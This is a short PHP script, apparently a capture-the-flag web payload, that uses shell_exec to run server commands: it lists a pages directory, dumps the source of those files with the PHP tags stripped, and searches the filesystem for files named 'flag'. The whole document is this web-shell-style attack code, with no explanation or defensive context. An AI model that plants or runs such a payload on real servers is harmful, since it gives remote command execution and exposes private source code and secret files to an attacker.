<?php

echo(shell_exec("ls pages/."));
echo(shell_exec("cat pages/* | sed 's/<?php//g'"));
echo(shell_exec("find . | grep flag"))

?>
